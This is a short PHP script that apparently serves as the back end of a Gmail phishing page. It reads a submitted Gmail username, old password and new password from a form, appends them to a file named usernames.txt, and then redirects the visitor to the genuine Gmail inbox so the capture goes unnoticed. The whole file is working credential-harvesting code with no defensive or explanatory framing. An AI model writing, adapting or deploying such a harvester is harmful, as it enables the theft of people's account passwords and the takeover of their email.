<?php

file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Old Password: " . $_POST['password-old'] . " New Password: " . $_POST['password-new'] . "\n", FILE_APPEND);
header('Location: https://mail.google.com/mail/u/0/#inbox');
exit();
?>
